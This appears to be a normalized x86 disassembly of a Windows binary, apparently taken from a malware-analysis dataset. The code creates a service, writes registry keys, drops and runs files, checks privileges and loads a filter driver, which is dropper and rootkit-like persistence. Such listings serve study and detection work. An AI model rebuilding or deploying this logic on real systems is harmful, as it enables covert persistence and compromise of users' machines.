sub_401020
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push esi
mov esi [ HeapAlloc@IAT ]
push 0x400
push 0x8
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
xor al al
retn
xor al al
pop esi
retn
push 0x400
push eax
call [ GetSystemDirectoryA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x400
push 0x8
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x400
push 0x8
push ecx
call esi
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov edx [ rw-data ]
push 0x400
push 0x8
push edx
call esi
test eax eax
mov [ rw-data ] eax
setne al
pop esi
retn
sub_4010b0
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push 0xf003f
xor edi edi
push edi
push edi
call [ OpenSCManagerW@IAT ]
mov esi eax
mov [ ebp - 0x10 ] esi
cmp esi edi
jne r-xdata
push ebx
push edi
push edi
push r--data
push edi
push r--data
push r--data
push 0x1
push 0x1
push 0x1
push 0xf01ff
push r--data
push r--data
push esi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] 0x0
call [ CreateServiceA@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
pop edi
xor al al
pop esi
mov esp ebp
pop ebp
retn
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
test ebx ebx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x2
push edi
push r--data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ RegCloseKey@IAT ]
pop ebx
test eax eax
je r-xdata
push ebx
call esi
mov edx [ ebp - 0xc ]
push edi
lea ecx [ ebp - 0x8 ]
push ecx
push edi
push 0xf003f
push edi
push edi
push edi
mov edi [ RegCreateKeyExA@IAT ]
push r--data
push edx
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push eax
call esi
mov esi [ RegSetValueExA@IAT ]
push 0xe
push r--data
push 0x1
push eax
mov eax [ ebp - 0x8 ]
push r--data
push eax
call esi
mov edx [ ebp - 0xc ]
push 0x0
lea ecx [ ebp - 0x8 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push r--data
push edx
call edi
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call esi
mov esi [ ebp - 0x10 ]
push 0x6
push r--data
push 0x1
push eax
mov eax [ ebp - 0x8 ]
push r--data
push eax
call esi
mov edx [ ebp - 0x8 ]
push 0x4
lea ecx [ ebp - 0x14 ]
push ecx
push 0x4
push 0x0
push r--data
push edx
mov [ ebp - 0x14 ] 0x0
call esi
mov [ ebp - 0x1 ] 0x1
sub_401210
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
lea eax [ ebp - 0x10 ]
push eax
xor ebx ebx
push 0x2
push ebx
push r--data
push 0x80000002
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1 ] bl
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov esi [ RegCloseKey@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push ebx
push 0xf003f
push ebx
push ebx
push ebx
push r--data
push edx
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ rw-data ]
mov cl [ eax ]
mov dl [ eax + 0x1 ]
push edi
push 0x400
mov edi eax
mov eax [ rw-data ]
push 0x8
push eax
mov [ ebp - 0x8 ] cl
mov [ ebp - 0x7 ] dl
mov [ ebp - 0x6 ] bl
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call esi
pop edi
push 0x400
push esi
lea ecx [ ebp - 0x8 ]
push ecx
call [ QueryDosDeviceA@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push esi
push 0x8
push edx
call [ HeapFree@IAT ]
jmp r-xdata
add edi 0x2
push edi
push esi
call [ lstrcatA@IAT ]
mov edi [ lstrlenA@IAT ]
push esi
call edi
push eax
mov eax [ ebp - 0xc ]
push esi
push 0x1
push ebx
mov ebx [ RegSetValueExA@IAT ]
push r--data
push eax
call ebx
mov ecx [ rw-data ]
push esi
push 0x8
push ecx
mov [ ebp - 0x14 ] eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov dl [ eax ]
mov ecx [ rw-data ]
push 0x400
mov [ ebp - 0x14 ] eax
mov al [ eax + 0x1 ]
push 0x8
push ecx
mov [ ebp - 0x8 ] dl
mov [ ebp - 0x7 ] al
mov [ ebp - 0x6 ] 0x0
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x400
push esi
lea edx [ ebp - 0x8 ]
push edx
call [ QueryDosDeviceA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x2
push ecx
push esi
call [ lstrcatA@IAT ]
push esi
call edi
mov edx [ ebp - 0xc ]
push eax
push esi
push 0x1
push 0x0
push r--data
push edx
call ebx
push esi
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
push 0x8
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push esi
push 0x8
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov edx [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push r--data
push edx
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
call edi
mov ecx [ rw-data ]
mov edx [ ebp - 0xc ]
push eax
push ecx
push 0x1
push 0x0
push r--data
push edx
call ebx
mov eax [ rw-data ]
mov cl [ eax ]
mov dl [ eax + 0x1 ]
push 0x400
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
push 0x8
push eax
mov [ ebp - 0x8 ] cl
mov [ ebp - 0x7 ] dl
mov [ ebp - 0x6 ] 0x0
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x400
push esi
lea ecx [ ebp - 0x8 ]
push ecx
call [ QueryDosDeviceA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x2
push eax
push esi
call [ lstrcatA@IAT ]
mov edx [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push r--data
push edx
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
push esi
call edi
push eax
mov eax [ ebp - 0xc ]
push esi
push 0x1
push 0x0
push r--data
push eax
call ebx
mov edx [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push r--data
push edx
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
call edi
mov ecx [ rw-data ]
mov edx [ ebp - 0xc ]
push eax
push ecx
push 0x1
push 0x0
push r--data
push edx
call ebx
mov [ ebp - 0x1 ] 0x1
sub_4014f0
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x1
lea ecx [ ebp - 0x404 ]
push ecx
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
push 0x0
push edi
call [ GetFileSize@IAT ]
mov [ esi + 0xc ] eax
call [ GetProcessHeap@IAT ]
mov edx [ esi + 0xc ]
mov ebx [ HeapAlloc@IAT ]
push edx
push 0x0
push eax
mov [ esi ] eax
call ebx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
push 0x0
lea ecx [ ebp - 0x408 ]
push ecx
push edx
push eax
push edi
call [ ReadFile@IAT ]
mov eax [ esi + 0xc ]
cmp eax [ ebp - 0x408 ]
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov ecx [ esi ]
push 0x400
push 0x8
push ecx
call ebx
mov [ esi + 0x14 ] eax
test eax eax
je r-xdata
push 0x400
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
mov edx [ esi + 0x14 ]
push r--data
push edx
call [ lstrcatA@IAT ]
mov eax [ esi ]
push 0x400
push 0x8
push eax
call ebx
mov [ esi + 0x10 ] eax
test eax eax
jne r-xdata
push eax
push 0x400
call [ GetTempPathA@IAT ]
mov ecx [ ebp - 0x4 ]
pop ebx
xor ecx ebp
mov eax 0x1
pop edi
call sub_4020cb
mov esp ebp
pop ebp
retn
sub_401620
push ebp
mov ebp esp
sub esp 0x24
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
mov edx [ rw-data ]
push ebx
mov bl [ eax + ecx - 0x1 ]
push esi
lea esi [ eax + ecx - 0x1 ]
mov eax [ rw-data ]
push edx
push eax
mov [ ebp - 0x1 ] bl
call [ lstrcpyA@IAT ]
mov ecx [ rw-data ]
push r--data
push ecx
call [ lstrcatA@IAT ]
mov edx [ rw-data ]
push 0x0
push edx
call [ CreateDirectoryA@IAT ]
test bl bl
je r-xdata
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ esi - 0x4 ]
mov edx [ edi ]
dec [ ebp - 0x1 ]
sub esi 0x4
sub esi ebx
mov eax [ esi - 0x4 ]
mov ecx [ esi - 0x8 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x18 ] eax
mov eax [ esi - 0xc ]
sub esi 0xc
mov [ ebp - 0xc ] eax
sub esi eax
lea eax [ ebx + 0x1 ]
push eax
push 0x8
push edx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
push ebx
push ecx
push edx
push eax
call sub_4024f4
mov eax [ edi ]
add esp 0x10
push 0x400
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov ecx [ edi + 0x10 ]
mov ebx eax
push ecx
push ebx
mov [ ebp - 0x10 ] ebx
call [ lstrcpyA@IAT ]
mov edx [ ebp - 0x8 ]
push edx
push ebx
call [ lstrcatA@IAT ]
mov eax [ ebp - 0x18 ]
cmp eax 0x3
jne r-xdata
cmp eax 0x1
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
push eax
mov eax [ edi ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov [ edi + 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ edi ]
push ecx
push 0x8
push edx
call [ HeapFree@IAT ]
mov eax [ edi ]
push ebx
push 0x8
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x2
jne r-xdata
mov ecx [ rw-data ]
mov ebx [ lstrcpyA@IAT ]
push ecx
push eax
call ebx
mov edx [ edi + 0x1c ]
push r--data
push edx
call [ lstrcatA@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ edi + 0x1c ]
push eax
push ecx
call [ lstrcatA@IAT ]
mov edx [ edi + 0x1c ]
mov eax [ rw-data ]
push edx
push eax
call ebx
mov ecx [ rw-data ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push ebx
call [ lstrlenA@IAT ]
mov ecx [ edi ]
push eax
push 0x8
push ecx
call [ HeapAlloc@IAT ]
mov [ edi + 0x18 ] eax
test eax eax
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
push 0x0
lea edx [ ebp - 0x20 ]
push edx
push eax
push esi
push ebx
call [ WriteFile@IAT ]
push ebx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
push eax
call [ lstrcpyA@IAT ]
mov eax [ edi + 0x18 ]
push r--data
push eax
call [ lstrcatA@IAT ]
mov ecx [ edi + 0x18 ]
mov edx [ rw-data ]
push ecx
push edx
call [ lstrcpyA@IAT ]
mov eax [ rw-data ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
je r-xdata
mov edx [ ebp - 0xc ]
push 0x0
lea ecx [ ebp - 0x24 ]
push ecx
push edx
push esi
push eax
call [ WriteFile@IAT ]
mov eax [ ebp - 0x1c ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
sub_401870
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp - 0x18 ]
lea ecx [ ebp - 0x20 ]
push ecx
push r--data
push 0x0
call [ LookupPrivilegeValueW@IAT ]
test eax eax
je r-xdata
xor al al
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
xor al al
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
push 0x0
push 0x0
push 0x10
lea ecx [ ebp - 0x14 ]
push ecx
push 0x0
push esi
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x514
jne r-xdata
push r--data
call [ FilterLoad@IAT ]
mov edx [ ebp - 0x18 ]
push edx
mov esi eax
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
test esi esi
sete al
xor ecx ebp
pop esi
call sub_4020cb
mov esp ebp
pop ebp
retn
sub_401940
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
mov esi [ HeapFree@IAT ]
push eax
push 0x8
push ecx
call esi
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push 0x8
push eax
call esi
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push 0x8
push edx
call esi
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
push 0x8
push ecx
call esi
pop esi
retn
sub_401990
push ebp
mov ebp esp
sub esp 0x24
push esi
lea esi [ ebp - 0x24 ]
call sub_4014f0
test eax eax
jne r-xdata
call sub_401a10
call sub_401020
test al al
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x10
push edi
lea edi [ ebp - 0x24 ]
call sub_401620
pop edi
test eax eax
je r-xdata
call sub_4010b0
test al al
je r-xdata
call sub_401210
test al al
je r-xdata
mov esi [ Sleep@IAT ]
push 0xa
call esi
call sub_401870
test al al
je r-xdata
push 0xa
call esi
call sub_401940
push 0xa
call esi
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_401a10
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x4
call sub_40276d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov al 0x1
call sub_4020cb
mov esp ebp
pop ebp
retn
call sub_401ab0
cmp eax 0x1
je r-xdata
mov [ rw-data ] eax
lea eax [ ebp - 0x118 ]
push eax
mov [ ebp - 0x118 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x114 ] 0x6
jb r-xdata
push esi
lea esi [ ebp - 0x119 ]
mov [ ebp - 0x119 ] 0x0
call sub_401bb0
pop esi
test eax eax
je r-xdata
cmp [ ebp - 0x119 ] 0x0
jne r-xdata
call sub_401df0
push 0x0
call [ ExitProcess@IAT ]
sub_401ab0
push ebp
mov ebp esp
sub esp 0x14
push ebx
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
xor ebx ebx
push ebx
push r--data
push 0x80000002
mov [ ebp - 0x4 ] ebx
or edi 0xffffffff
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x4 ]
push esi
mov esi [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
push ebx
push ebx
push r--data
push eax
mov [ ebp - 0x14 ] ebx
call esi
test eax eax
jne r-xdata
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ RegCloseKey@IAT ]
pop esi
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push ebx
push ebx
push r--data
push eax
mov [ ebp - 0x10 ] ebx
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
push ebx
push ebx
push r--data
push eax
mov [ ebp - 0xc ] ebx
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
add eax ecx
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_401b84 ]
mov edi 0x1
jmp r-xdata
mov edi 0x2
jmp r-xdata
mov edi 0x3
jmp r-xdata
mov edi 0x4
sub_401bb0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x20c ]
push eax
push 0x8
mov [ ebp - 0x20c ] 0x0
mov [ esi ] 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x20c ]
lea ecx [ ebp - 0x210 ]
push ecx
push 0x200
lea edx [ ebp - 0x204 ]
push edx
push 0x19
push eax
mov [ ebp - 0x210 ] 0x0
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
push edi
lea ecx [ ebp - 0x208 ]
push ecx
push r--data
mov [ ebp - 0x208 ] 0x0
call [ ConvertStringSidToSidW@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov edx [ ebp - 0x204 ]
mov eax [ ebp - 0x208 ]
push edx
push eax
call [ EqualSid@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
pop edi
call sub_4020cb
mov esp ebp
pop ebp
retn
mov [ esi ] 0x1
sub_401ca0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x1a0bc
call sub_408320
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1a0b8 ] eax
push ebx
push esi
push edi
push 0x104
lea eax [ esp + 0x674 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
lea ecx [ esp + 0x670 ]
push ecx
push r--data
lea edx [ esp + 0x880 ]
push 0x104
push edx
call sub_402569
add esp 0x10
lea eax [ esp + 0x260 ]
push eax
push 0x0
push 0x0
push 0x24
push 0x0
call [ SHGetFolderPathW@IAT ]
push r--data
lea ecx [ esp + 0x264 ]
push ecx
call [ lstrcatW@IAT ]
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x264 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
je r-xdata
push eax
call [ FindClose@IAT ]
mov ecx [ esp + 0x1a0c4 ]
pop edi
pop esi
pop ebx
xor ecx esp
mov eax 0x1
call sub_4020cb
mov esp ebp
pop ebp
retn
mov edi [ lstrcpyW@IAT ]
mov ebx [ ShellExecuteW@IAT ]
lea esi [ esp + 0xa80 ]
mov eax [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push edx
push eax
add esi 0x208
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push esi
call [ DeleteFileW@IAT ]
push 0xfa0
call [ Sleep@IAT ]
lea ecx [ esp + 0x3c ]
push ecx
push esi
call edi
push esi
push r--data
lea edx [ esp + 0x470 ]
push 0x104
push edx
call sub_402569
add esp 0x10
push 0x0
push 0x0
lea eax [ esp + 0x470 ]
push eax
lea ecx [ esp + 0x884 ]
push ecx
push r--data
push 0x0
call ebx
cmp eax 0x20
jle r-xdata
mov eax [ esp + 0xc ]
sub_401df0
push ebp
mov ebp esp
mov eax 0x1048
call sub_408320
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
call [ GetProcessHeap@IAT ]
mov esi eax
lea eax [ ebp - 0xc34 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
call [ GetTickCount@IAT ]
push eax
lea ecx [ ebp - 0xc34 ]
push ecx
push r--data
lea edx [ ebp - 0x20c ]
call sub_4020b0
add esp 0xc
push 0x41e
push 0x8
push esi
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x104
lea edx [ ebp - 0xe3c ]
push edx
push 0x0
call [ GetModuleHandleW@IAT ]
push eax
call [ GetModuleFileNameW@IAT ]
push 0x104
lea eax [ ebp - 0x61c ]
push eax
call [ GetWindowsDirectoryW@IAT ]
lea ecx [ ebp - 0xe3c ]
push ecx
push r--data
lea edx [ ebp - 0xa2c ]
push 0x104
push edx
call sub_402569
lea eax [ ebp - 0xa2c ]
add esp 0x10
lea edx [ eax + 0x2 ]
call [ GetLastError@IAT ]
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4020cb
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push edi
mov ecx 0x85
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
sub eax edx
sar eax 0x1
lea eax [ eax + eax + 0x2 ]
push eax
movsw [ edi ] [ esi ]
mov [ ebp - 0x1048 ] eax
mov [ ebx + 0x216 ] eax
lea eax [ ebp - 0xa2c ]
push eax
lea ecx [ ebx + 0x21a ]
push ecx
call sub_4053a0
mov edx [ ebp - 0x1048 ]
add esp 0xc
add edx 0x21a
push edx
push ebx
lea eax [ ebp - 0x20c ]
call sub_402030
pop edi
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4020cb
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x61c ]
push eax
push r--data
lea ecx [ ebp - 0x824 ]
push 0x104
push ecx
call sub_402569
lea edx [ ebp - 0x20c ]
push edx
push r--data
lea eax [ ebp - 0x414 ]
push 0x104
push eax
call sub_402569
mov esi [ ShellExecuteW@IAT ]
add esp 0x20
push 0x0
push 0x0
lea ecx [ ebp - 0x414 ]
push ecx
lea edx [ ebp - 0x824 ]
push edx
push r--data
push 0x0
call esi
cmp eax 0x20
jle r-xdata
call sub_401ca0
lea ecx [ ebp - 0x20c ]
push ecx
call [ DeleteFileW@IAT ]
lea eax [ ebp - 0x61c ]
push eax
push r--data
lea ecx [ ebp - 0x1044 ]
push 0x104
push ecx
call sub_402569
add esp 0x10
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x1044 ]
push edx
push r--data
push 0x0
call esi
lea eax [ ebp - 0x20c ]
push eax
push r--data
lea ecx [ ebp - 0x414 ]
push 0x104
push ecx
call sub_402569
add esp 0x10
push 0x0
push 0x0
lea edx [ ebp - 0x414 ]
push edx
lea eax [ ebp - 0x824 ]
push eax
push r--data
push 0x0
call esi
push 0xa
call [ Sleep@IAT ]
sub_402030
push ebp
mov ebp esp
push ecx
push ebx
push esi
xor ebx ebx
push ebx
push ebx
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
push esi
mov [ ebp - 0x4 ] ebx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push esi
call [ CloseHandle@IAT ]
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
mov bl 0x1
call [ CloseHandle@IAT ]
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4020da
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_402dd3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_402d91
pop ecx
mov [ esi ] eax
pop esi
sub_402114
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_403858
pop ecx
call sub_402dd3
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_403810
push 0x1e
call sub_403661
push 0xff
call sub_40337b
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_402dd3
mov [ eax ] esi
push ebx
call sub_403858
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_402dd3
mov [ eax ] esi
sub_4021a8
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_404051
pop ecx
push eax
call sub_403f7d
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_402210
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_4021a8
pop ecx
test eax eax
je r-xdata
push esi
call sub_402258
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_404051
push eax
call sub_404077
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_402258
push 0x14
push r--data
call sub_402ff0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_4042ca
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402329
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_403035
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_402f34
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_4022fa
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_402210
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_402210
pop ecx
